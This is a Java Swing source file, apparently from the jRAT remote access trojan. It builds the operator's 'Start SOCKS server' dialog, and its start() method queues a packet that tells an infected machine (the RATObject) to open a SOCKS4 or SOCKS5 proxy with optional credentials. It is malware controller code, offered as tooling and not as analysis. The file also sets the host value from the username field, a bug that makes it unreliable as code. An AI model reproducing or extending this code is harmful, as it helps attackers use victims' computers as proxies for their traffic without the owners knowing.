package se.jrat.plugin.socks.client;

import java.awt.Color;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;

import javax.swing.ButtonGroup;
import javax.swing.GroupLayout;
import javax.swing.GroupLayout.Alignment;
import javax.swing.JButton;
import javax.swing.JCheckBox;
import javax.swing.JFrame;
import javax.swing.JLabel;
import javax.swing.JPanel;
import javax.swing.JRadioButton;
import javax.swing.JSpinner;
import javax.swing.JTextField;
import javax.swing.LayoutStyle.ComponentPlacement;
import javax.swing.SpinnerNumberModel;
import javax.swing.border.EmptyBorder;

import jrat.api.RATObject;

@SuppressWarnings("serial")
public class FrameSocks extends JFrame {

	private JPanel contentPane;
	private JRadioButton rdbtnSocks5;
	private JRadioButton rdbtnSocks4;
	private ButtonGroup socksGroup = new ButtonGroup();
	private JTextField txtHost;
	private JTextField txtUser;
	private JTextField txtPass;
	private JCheckBox chckbxUseAuthentication;
	private JSpinner spinner;
	private RATObject ratobj;
	private JLabel lbl;

	public FrameSocks(RATObject ratobj) {
		this.ratobj = ratobj;
		setTitle("Start SOCKS server");
		setResizable(false);
		setDefaultCloseOperation(JFrame.DISPOSE_ON_CLOSE);
		setBounds(100, 100, 337, 219);
		contentPane = new JPanel();
		contentPane.setBorder(new EmptyBorder(5, 5, 5, 5));
		setContentPane(contentPane);
		
		rdbtnSocks5 = new JRadioButton("SOCKS5");
		rdbtnSocks5.setSelected(true);
		socksGroup.add(rdbtnSocks5);
		
		rdbtnSocks4 = new JRadioButton("SOCKS4");
		socksGroup.add(rdbtnSocks4);
		
		chckbxUseAuthentication = new JCheckBox("Use authentication");
		chckbxUseAuthentication.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				boolean auth = chckbxUseAuthentication.isSelected();
				txtUser.setEnabled(auth);
				txtPass.setEnabled(auth);
			}
		});
		
		JLabel lblHost = new JLabel("Host:");
		
		txtHost = new JTextField();
		txtHost.setEditable(false);
		txtHost.setColumns(10);
		txtHost.setText(ratobj.getIP().split(" / ")[0]);
		
		spinner = new JSpinner();
		spinner.setModel(new SpinnerNumberModel(1080, 1, 65535, 1));
		
		JLabel lblUser = new JLabel("User:");
		
		txtUser = new JTextField();
		txtUser.setEnabled(false);
		txtUser.setColumns(10);
		
		JLabel lblPass = new JLabel("Pass:");
		
		txtPass = new JTextField();
		txtPass.setEnabled(false);
		txtPass.setColumns(10);
		
		JButton btnStart = new JButton("Start");
		btnStart.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				start();
			}
		});
		
		lbl = new JLabel("Idle...");
		GroupLayout gl_contentPane = new GroupLayout(contentPane);
		gl_contentPane.setHorizontalGroup(
			gl_contentPane.createParallelGroup(Alignment.LEADING)
				.addGroup(gl_contentPane.createSequentialGroup()
					.addContainerGap()
					.addGroup(gl_contentPane.createParallelGroup(Alignment.LEADING)
						.addGroup(gl_contentPane.createSequentialGroup()
							.addComponent(lblHost)
							.addPreferredGap(ComponentPlacement.UNRELATED)
							.addComponent(txtHost, GroupLayout.PREFERRED_SIZE, 176, GroupLayout.PREFERRED_SIZE)
							.addPreferredGap(ComponentPlacement.RELATED)
							.addComponent(spinner, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE))
						.addGroup(gl_contentPane.createParallelGroup(Alignment.LEADING)
							.addGroup(gl_contentPane.createSequentialGroup()
								.addComponent(lblPass)
								.addGap(10)
								.addComponent(txtPass, GroupLayout.PREFERRED_SIZE, 251, GroupLayout.PREFERRED_SIZE))
							.addGroup(gl_contentPane.createSequentialGroup()
								.addComponent(lblUser)
								.addPreferredGap(ComponentPlacement.UNRELATED)
								.addComponent(txtUser))
							.addGroup(Alignment.TRAILING, gl_contentPane.createSequentialGroup()
								.addComponent(lbl)
								.addPreferredGap(ComponentPlacement.RELATED, 184, Short.MAX_VALUE)
								.addComponent(btnStart)))
						.addGroup(gl_contentPane.createSequentialGroup()
							.addComponent(rdbtnSocks5)
							.addPreferredGap(ComponentPlacement.RELATED)
							.addComponent(rdbtnSocks4, GroupLayout.PREFERRED_SIZE, 65, GroupLayout.PREFERRED_SIZE)
							.addPreferredGap(ComponentPlacement.UNRELATED)
							.addComponent(chckbxUseAuthentication)))
					.addContainerGap(22, Short.MAX_VALUE))
		);
		gl_contentPane.setVerticalGroup(
			gl_contentPane.createParallelGroup(Alignment.LEADING)
				.addGroup(gl_contentPane.createSequentialGroup()
					.addContainerGap()
					.addGroup(gl_contentPane.createParallelGroup(Alignment.BASELINE)
						.addComponent(lblHost)
						.addComponent(txtHost, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE)
						.addComponent(spinner, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE))
					.addGap(11)
					.addGroup(gl_contentPane.createParallelGroup(Alignment.BASELINE)
						.addComponent(rdbtnSocks5)
						.addComponent(rdbtnSocks4)
						.addComponent(chckbxUseAuthentication))
					.addPreferredGap(ComponentPlacement.UNRELATED)
					.addGroup(gl_contentPane.createParallelGroup(Alignment.BASELINE)
						.addComponent(lblUser)
						.addComponent(txtUser, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE))
					.addGroup(gl_contentPane.createParallelGroup(Alignment.LEADING)
						.addGroup(gl_contentPane.createSequentialGroup()
							.addPreferredGap(ComponentPlacement.RELATED)
							.addComponent(lblPass))
						.addGroup(gl_contentPane.createSequentialGroup()
							.addGap(7)
							.addComponent(txtPass, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE)))
					.addPreferredGap(ComponentPlacement.RELATED, 27, Short.MAX_VALUE)
					.addGroup(gl_contentPane.createParallelGroup(Alignment.BASELINE)
						.addComponent(btnStart)
						.addComponent(lbl))
					.addContainerGap())
		);
		contentPane.setLayout(gl_contentPane);
	}
	
	private void start() {
		try {
			boolean socks5 = rdbtnSocks5.isSelected();
			boolean auth = chckbxUseAuthentication.isSelected();
			String user = txtUser.getText();
			String pass = txtPass.getText();
			String host = txtUser.getText();
			int port = (Integer) spinner.getValue();
			
			Packet118Start packet = new Packet118Start(ratobj, socks5, auth, user, pass, host, port);
			packet.setFrame(this);
			ratobj.addToSendQueue(packet);
		} catch (Exception ex) {
			ex.printStackTrace();
		}
	}

	public void setLabelColor(Color color) {
		lbl.setForeground(color);
	}

	public void setLabelText(String s) {
		lbl.setText(s);
	}
}
